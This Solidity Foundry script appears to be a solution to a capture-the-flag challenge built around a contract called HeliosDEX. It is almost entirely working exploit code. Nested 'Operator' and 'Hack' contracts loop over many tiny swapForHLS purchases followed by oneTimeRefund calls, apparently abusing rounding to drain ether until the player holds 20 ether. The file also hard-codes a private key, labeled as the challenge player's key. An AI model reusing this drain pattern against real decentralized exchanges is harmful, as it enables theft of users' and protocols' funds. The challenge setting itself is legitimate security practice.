// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";
import "../src/HeliosDEX.sol";

contract Solution is Script {
    Setup public setupAddr = Setup(0xfE7784b15CA34797F00cD63a707BaC6FFf8Cd42a);
    address wallet = 0xe7edC6d3E11cc8FE05aFFFC021157F8dF59c9c53;
    HeliosDEX public target = setupAddr.TARGET();

    EldorionFang public eldorionFang = target.eldorionFang();
    MalakarEssence public malakarEssence = target.malakarEssence();
    HeliosLuminaShards public heliosLuminaShards = target.heliosLuminaShards();

    function setUp() public {

    }

    function run() public {
        vm.startBroadcast(0xa44e6744305dde0bbb0a838876e127a8cd409271a6def2fe2b30dfacbeef576b);

        Operator hack;
        console.log(wallet.balance);
        // target.swapForHLS{value: 1e16}();
        // uint256 amount = heliosLuminaShards.balanceOf(wallet);
        // console.log(amount);
        // heliosLuminaShards.approve(address(target), amount);
        // target.oneTimeRefund(address(heliosLuminaShards), amount);
        for(uint256 i = 0; i < 10; i++) {
            hack = new Operator(target, heliosLuminaShards);
            hack.attack{value: 1 ether}();
            console.log(wallet.balance);
        }

        vm.stopBroadcast();
    }
}

contract Operator {
    HeliosDEX public target;
    HeliosLuminaShards public token;
    Hack public hack;
    
    constructor(HeliosDEX _target, HeliosLuminaShards _token) {
        target = _target;
        token = _token;
    }

    function attack() external payable {
        for(uint256 i = 0; i < 10; i++) {
            hack = new Hack(target, token);
            hack.attack{value: 1e5}();
        }
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {}
    
}

contract Hack {
    HeliosDEX public target;
    HeliosLuminaShards public token;
    
    constructor(HeliosDEX _target, HeliosLuminaShards _token) {
        target = _target;
        token = _token;
    }

    function attack() external payable {
        target.swapForHLS{value: msg.value}();
        uint256 amount = token.balanceOf(address(this));
        token.approve(address(target), amount);
        target.oneTimeRefund(address(token), amount);
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {}
}

// Player Private Key : 0xa44e6744305dde0bbb0a838876e127a8cd409271a6def2fe2b30dfacbeef576b
// Player Address     : 0xe7edC6d3E11cc8FE05aFFFC021157F8dF59c9c53
// Target contract    : 0x24156F8004586115E460fFf4B359650E0520cbdb
// Setup contract     : 0xfE7784b15CA34797F00cD63a707BaC6FFf8Cd42a

contract Setup {
    HeliosDEX public TARGET;
    address public player;
    
    event DeployedTarget(address at);

    constructor(address _player) payable {
        TARGET = new HeliosDEX{value: 1000 ether}(1000);
        player = _player;
        emit DeployedTarget(address(TARGET));
    }

    function isSolved() public view returns (bool) {
        return player.balance >= 20 ether;
    }
}
